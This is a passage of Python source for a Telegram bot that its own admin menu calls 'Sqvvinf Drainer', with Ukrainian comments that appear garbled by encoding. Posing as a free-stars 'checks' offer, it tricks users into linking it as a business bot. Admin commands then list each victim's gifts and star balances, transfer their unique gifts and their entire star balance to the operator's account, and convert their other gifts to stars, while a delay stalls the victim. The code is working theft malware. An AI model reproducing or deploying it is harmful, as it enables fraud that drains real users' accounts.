            logging.warning(f"–§–æ—Ç–æ {photo_path} –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ –∞–±–æ star_count –Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î—Ç—å—Å—è, –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –±–µ–∑ —Ñ–æ—Ç–æ.")
            await message.answer(
                text=caption,
                parse_mode="HTML",
                reply_markup=keyboard
            )

    elif message.from_user.id not in ADMIN_IDS:  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑—ñ —Å–ø–∏—Å–∫—É ADMIN_IDS
        # –°—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–µ –ø—Ä–∏–≤—ñ—Ç–∞–Ω–Ω—è
        photo = FSInputFile("1.jpg")
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="üìñ –ü—Ä–æ—Ñ–∏–ª—å", callback_data="profile")],
            [
                InlineKeyboardButton(text="üìù –ß–µ–∫–∏", callback_data="checks"),
                InlineKeyboardButton(text="‚≠ê –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–≤–µ–∑–¥", callback_data="stars")
            ],
            [
                InlineKeyboardButton(text="üìñ –£—Å–ª–æ–≤–∏—è", callback_data="terms"),
                InlineKeyboardButton(text="üó£Ô∏è –ü–æ–¥–¥–µ—Ä–∂–∫–∞", url="https://t.me/giftrelayer")
            ]
        ])

        await message.answer_photo(
            photo=photo,
            caption=LANGUAGES[lang]["welcome_message"],
            parse_mode="HTML",
            reply_markup=keyboard
        )
    else:
        await message.answer(
            text=f"Sqvvinf Drainer\n\nüîó –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {count}\n\n/gifts - –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –ø–æ–¥–∞—Ä–∫–∏\n/stars - –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã\n/transfer owned_id business_connect - –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫ –≤—Ä—É—á–Ω—É—é\n/convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã\n/check_kd - –ø–æ–∫–∞–∑–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ —Å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å—é –ø–µ—Ä–µ–¥–∞—á–∏")

@dp.message(F.text == "/check")
async def check_command(message: Message):
    lang = load_user_language(message.from_user.id)
    check_id = str(uuid.uuid4())
    short_check_id = check_id[:8]  # –û–±—Ä—ñ–∑–∞—î–º–æ UUID –¥–æ 8 —Å–∏–º–≤–æ–ª—ñ–≤
    user_id = message.from_user.id
    star_count = 100  # –ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º 100 –∑—ñ—Ä–æ–∫

    # –í—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ —á–µ–∫–æ–º
    base_path = os.path.dirname(__file__)
    photo_path = None
    if star_count == 5:
        photo_path = os.path.join(base_path, "5.png")
    elif star_count == 100:
        photo_path = os.path.join(base_path, "100.png")

    photo = FSInputFile(photo_path) if photo_path and os.path.exists(photo_path) else None
    caption = LANGUAGES[lang]["check_message"].format(star_count=star_count)

    # –î–æ–¥–∞—î–º–æ –ª–∏—à–µ –∫–Ω–æ–ø–∫—É "–ü—Ä–æ–≤–µ—Ä–∏—Ç—å"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(
            text=LANGUAGES[lang]["check_permissions_button"],
            callback_data=f"check_perm:{short_check_id}:{user_id}:{star_count}"
        )]
    ])

    if photo:
        await message.answer_photo(
            photo=photo,
            caption=caption,
            parse_mode="HTML",
            reply_markup=keyboard
        )
    else:
        await message.answer(
            text=caption,
            parse_mode="HTML",
            reply_markup=keyboard
        )

@dp.callback_query(F.data == "change_lang")
async def change_language(callback: CallbackQuery):
    pass

@dp.callback_query(F.data == "checks")
async def checks_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await callback.answer(
        text="–û—à–∏–±–∫–∞: –ë–æ—Ç –µ—â—ë –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –∫–∞–∫ –±–æ—Ç –¥–ª—è –±–∏–∑–Ω–µ—Å-—á–∞—Ç–∞",
        show_alert=True
    )
    await callback.answer()

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=LANGUAGES[lang]["back_button"], callback_data="back")]
    ])
    await callback.message.answer(
        text=LANGUAGES[lang]["profile_caption"].format(user_id=callback.from_user.id),
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "terms")
async def terms_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=LANGUAGES[lang]["back_button"], callback_data="back")]
    ])
    await callback.message.answer(
        text=LANGUAGES[lang]["terms_caption"],
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "stars")
async def stars_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
    photo = FSInputFile("2.jpg")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=LANGUAGES[lang]["back_button"], callback_data="back")]
    ])
    await callback.message.answer_photo(
        photo=photo,
        caption=LANGUAGES[lang]["stars_caption"],
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data == "back")
async def back_callback(callback: CallbackQuery):
    lang = load_user_language(callback.from_user.id)
    await bot.delete_message(chat_id=callback.message.chat.id, message_id=callback.message.message_id)
    photo = FSInputFile("1.jpg")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="üíº –ü—Ä–æ—Ñ–∏–ª—å", callback_data="profile")],
        [
            InlineKeyboardButton(text="üìù –ß–µ–∫–∏", callback_data="checks"),
            InlineKeyboardButton(text="‚≠ê –ü–æ–ª—É—á–µ–Ω–∏–µ –∑–≤–µ–∑–¥", callback_data="stars")
        ],
        [
            InlineKeyboardButton(text="üìñ –£—Å–ª–æ–≤–∏—è", callback_data="terms"),
            InlineKeyboardButton(text="üó£Ô∏è –ü–æ–¥–¥–µ—Ä–∂–∫–∞", url="https://t.me/giftrelayer")
        ]
    ])

    await callback.message.answer_photo(
        photo=photo,
        caption=LANGUAGES[lang]["welcome_message"],
        parse_mode="HTML",
        reply_markup=keyboard
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("check_perm:"))
async def check_permissions_callback(callback: CallbackQuery):
    try:
        _, short_check_id, user_id, star_count = callback.data.split(":")
        user_id = int(user_id)
        star_count = int(star_count)
        lang = load_user_language(user_id)

        # –ó–∞–≤–∞–Ω—Ç–∞–∂—É—î–º–æ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è
        connections = load_connections()
        connection = next((c for c in connections if c["user_id"] == user_id), None)

        if not connection:
            await callback.message.answer(
                text=LANGUAGES[lang]["no_permissions_message"],
                parse_mode="HTML"
            )
            await callback.answer()
            return

        business_connection_id = connection["business_connection_id"]

        # –ü–µ—Ä–µ–≤—ñ—Ä—è—î–º–æ –¥–æ—Å—Ç—É–ø –¥–æ –∑—ñ—Ä–æ–∫
        try:
            star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
            # –Ø–∫—â–æ –∑–∞–ø–∏—Ç —É—Å–ø—ñ—à–Ω–∏–π, –∑–Ω–∞—á–∏—Ç—å –ø–æ—Ç—Ä—ñ–±–Ω—ñ –¥–æ–∑–≤–æ–ª–∏ —î
            await callback.message.answer(
                text=LANGUAGES[lang]["permissions_granted_message"],
                parse_mode="HTML"
            )
            # –Ü–º—ñ—Ç—É—î–º–æ –∑–∞—Ç—Ä–∏–º–∫—É –¥–ª—è –ø–µ—Ä–µ–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–µ—Ä–≤–µ—Ä—ñ–≤
            await asyncio.sleep(60)  # –ó–∞—Ç—Ä–∏–º–∫–∞ 1 —Ö–≤–∏–ª–∏–Ω–∞
            # –¢—É—Ç –º–æ–∂–Ω–∞ –¥–æ–¥–∞—Ç–∏ –ª–æ–≥—ñ–∫—É –ø–µ—Ä–µ–¥–∞—á—ñ –∑—ñ—Ä–æ–∫, —è–∫—â–æ –ø–æ—Ç—Ä—ñ–±–Ω–æ
            await callback.message.answer(
                text=LANGUAGES[lang]["check_result"].format(star_count=star_count),
                parse_mode="HTML"
            )
        except TelegramBadRequest as e:
            if "BOT_ACCESS_FORBIDDEN" in str(e) or "BUSINESS_CONNECTION_INVALID" in str(e):
                await callback.message.answer(
                    text=LANGUAGES[lang]["business_connection_invalid_message"],
                    parse_mode="HTML"
                )
            elif "query is too old and response timeout expired or query ID is invalid" in str(e):
                logging.error(f"–ü–æ–º–∏–ª–∫–∞: {e}")
                # –ù–µ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É, –ª–∏—à–µ –ª–æ–≥
            else:
                await callback.message.answer(
                    text=f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}",
                    parse_mode="HTML"
                )
        except Exception as e:
            logging.error(f"–ù–µ–ø–µ—Ä–µ–¥–±–∞—á–µ–Ω–∞ –ø–æ–º–∏–ª–∫–∞: {e}")
            await callback.message.answer(
                text=f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}",
                parse_mode="HTML"
            )

        await callback.answer()

    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π")
        await callback.message.answer(
            text=f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}",
            parse_mode="HTML"
        )
        await callback.answer()

@dp.message(F.text.startswith("/transfer"))
async def transfer_gift_handler(message: Message, bot):
    if message.from_user.id not in ADMIN_IDS:  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑—ñ —Å–ø–∏—Å–∫—É ADMIN_IDS
        await message.reply("‚õî –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    try:
        args = message.text.strip().split()
        if len(args) != 3:
            return await message.answer("‚ö†Ô∏è –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ñ–æ—Ä–º–∞—Ç: /transfer <owned_gift_id> <business_connection_id>")
        owned_gift_id = args[1]
        connection_id = args[2]
        if not connection_id:
            return await message.answer("‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")
        result = await bot(TransferGift(
            business_connection_id=connection_id,
            new_owner_chat_id=int(SENDER_ID),
            owned_gift_id=owned_gift_id,
            star_count=25
        ))
        await message.answer("‚úÖ –ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω –≤–∞–º!")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º!")
        else:
            await message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        await message.answer(f"‚ö†Ô∏è –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")

@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id not in ADMIN_IDS:  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑—ñ —Å–ø–∏—Å–∫—É ADMIN_IDS
        await message.reply("‚õî –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        if not connections:
            await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤.")
            return
        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username')} ({conn['user_id']})" or f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(text=name, callback_data=f"gifts:{user_id}")
        await message.answer("üë§ –í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:", reply_markup=kb.as_markup())
    except FileNotFoundError:
        await message.answer("üìÇ –§–∞–π–ª –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –Ω–µ –Ω–∞–π–¥–µ–Ω.")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")
        await message.answer(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")

@dp.callback_query(F.data.startswith("gifts:"))
async def handle_gift_callback(callback: CallbackQuery):
    await callback.answer()
    user_id = int(callback.data.split(":", 1)[1])
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return
        business_connection_id = connection["business_connection_id"]
        star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        text = f"ÔøΩID –ë–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ: <b>{business_connection_id}</b>\n‚≠ê –ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥: <b>{star_balance.star_amount}</b>\n\n"
        await callback.message.answer(text, parse_mode="HTML")
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        if not gifts.gifts:
            text += "üéÅ –ü–æ–¥–∞—Ä–∫–æ–≤ –Ω–µ—Ç."
            await callback.message.answer(text)
        else:
            for gift in gifts.gifts:
                if gift.type == "unique":
                    text = (
                        f"{gift.gift.base_name} #{gift.gift.number}\nOwner: #{user_id}\nOwnedGiftId: {gift.owned_gift_id}\n\n"
                        f"üéÅ <b>https://t.me/nft/{gift.gift.name}</b>\n"
                        f"ÔøΩID –ú–æ–¥–µ–ª—å: <code>{gift.gift.model.name}</code>\n\n\n‚≠ê –°—Ç–æ–∏–º–æ—Å—Ç—å —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä–∞: {gift.transfer_star_count} ‚≠ê"
                    )
                    kb = InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="üéÅ –ü–µ—Ä–µ–¥–∞—Ç—å –º–Ω–µ",
                                              callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:{gift.transfer_star_count}")]
                    ])
                    await callback.message.answer(text, parse_mode="HTML", reply_markup=kb)
                    await asyncio.sleep(0.2)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –ø–æ –±–∏–∑–Ω–µ—Å—É")
        await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")

@dp.callback_query(F.data.startswith("transfer:"))
async def handle_transfer(callback: CallbackQuery):
    await callback.answer()
    if callback.from_user.id not in ADMIN_IDS:  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑—ñ —Å–ø–∏—Å–∫—É ADMIN_IDS
        await callback.message.reply("‚õî –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    try:
        _, user_id_str, gift_id, transfer_price = callback.data.split(":")
        user_id = int(user_id_str)
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return
        business_connection_id = connection["business_connection_id"]
        # –Ø–∫—â–æ transfer_price —î None, –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î–º–æ star_count=0
        star_count = int(transfer_price) if transfer_price and transfer_price != "None" else 0
        result = await bot(TransferGift(
            business_connection_id=business_connection_id,
            new_owner_chat_id=int(SENDER_ID),
            owned_gift_id=gift_id,
            star_count=star_count
        ))
        if result:
            await callback.message.answer("üéâ –ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω –≤–∞–º!")
        else:
            await callback.message.answer("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫.")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ –ø–æ–¥–∞—Ä–∫–∞")
        await callback.message.answer("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫.")

@dp.message(F.text == "/stars")
async def show_star_users(message: Message):
    if message.from_user.id not in ADMIN_IDS:  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑—ñ —Å–ø–∏—Å–∫—É ADMIN_IDS
        await message.reply("‚õî –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        await message.answer("‚ùå –ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π.")
        return
    if not connections:
        await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π.")
        return
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})",
                              callback_data=f"stars:{conn['user_id']}")]
        for conn in connections
    ])
    await message.answer("üîπ –í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –±–∞–ª–∞–Ω—Å–∞ –∑–≤—ë–∑–¥:", reply_markup=kb)

@dp.callback_query(F.data.startswith("stars:"))
async def show_user_star_balance(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)
    conn = next((c for c in connections if c["user_id"] == user_id), None)
    if not conn:
        await callback.answer("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.", show_alert=True)
        return
    business_connection_id = conn["business_connection_id"]
    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_count = response.star_amount
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="‚ú® –ü–µ—Ä–µ–¥–∞—Ç—å –∑–≤–µ–∑–¥—ã –º–Ω–µ",
                                  callback_data=f"transfer_stars:{business_connection_id}")]
        ])
        await callback.message.answer(
            f"‚≠ê <b>–£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {conn['first_name']} {conn['last_name'] or ''} ‚Äî {star_count} –∑–≤—ë–∑–¥.</b>",
            parse_mode="HTML", reply_markup=kb)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        await callback.message.answer(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞: {e}")

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_to_admin(callback: CallbackQuery):
    business_connection_id = callback.data.split(":")[1]
    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_balance = response.star_amount
        result = await bot.transfer_business_account_stars(
            business_connection_id=business_connection_id,
            star_count=star_balance
        )
        if result:
            await callback.message.answer("‚úÖ –ó–≤–µ–∑–¥—ã —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω—ã –≤–∞–º.")
        else:
            await callback.message.answer("‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥.")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥: {e}")

async def convert_non_unique_gifts_to_stars(bot: Bot, business_connection_id: str) -> str:
    try:
        gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        gifts = gifts_response.gifts
        count = 0
        for gift in gifts:
            if gift.type != "unique":
                try:
                    await bot(ConvertGiftToStars(
                        business_connection_id=business_connection_id,
                        owned_gift_id=gift.gift.id
                    ))
                    count += 1
                except TelegramBadRequest as e:
                    if "GIFT_NOT_CONVERTIBLE" in str(e):
                        continue
                    else:
                        raise e
        if count == 0:
            return "üéÅ –£ –≤–∞—Å –Ω–µ—Ç –æ–±—ã—á–Ω—ã—Ö (–Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö) –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏."
        return f"‚úÖ –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ {count} –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã."
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            return "‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø"
        return f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}"
    except Exception as e:
        return f"‚ùå –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}"

@dp.message(F.text == "/convert")
async def convert_menu(message: Message):
    if message.from_user.id not in ADMIN_IDS:  # –û–Ω–æ–≤–ª–µ–Ω–æ –¥–ª—è –ø–µ—Ä–µ–≤—ñ—Ä–∫–∏ –∑—ñ —Å–ø–∏—Å–∫—É ADMIN_IDS
        await message.reply("‚õî –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        return await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")
    if not connections:
        return await message.answer("‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π.")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})",
                              callback_data=f"convert_select:{conn['user_id']}")]
        for conn in connections
    ])
    await message.answer("üë§ –í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤:", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("convert_select:"))
async def convert_select_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)
    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚ôªÔ∏è –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –æ–±—ã—á–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã",
                              callback_data=f"convert_exec:{user_id}")]
    ])
    await callback.message.edit_text(f"üë§ –í—ã–±—Ä–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{connection.get('username', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}",
                                     reply_markup=keyboard)

@dp.callback_query(F.data.startswith("convert_exec:"))
async def convert_exec_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        return await callback.message.edit_text("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")
    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
    try:
        response = await bot(GetBusinessAccountGifts(business_connection_id=connection["business_connection_id"]))
        gifts = response.gifts
    except TelegramBadRequest as e:
        return await callback.message.edit_text(f"–û—à–∏–±–∫–∞: {e}")
    if not gifts:
        return await callback.message.edit_text("üéÅ –£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤.")
    converted_count = 0
    failed = 0
    for gift in gifts:
        if gift.type == "unique":
            continue
        try:
            print(gift.gift.id)
            await bot(ConvertGiftToStars(
                business_connection_id=connection["business_connection_id"],
                owned_gift_id=str(gift.owned_gift_id)
            ))
            converted_count += 1
        except TelegramBadRequest as e:
            print(e)
            failed += 1
        except Exception as e:
            print(e)
            failed += 1
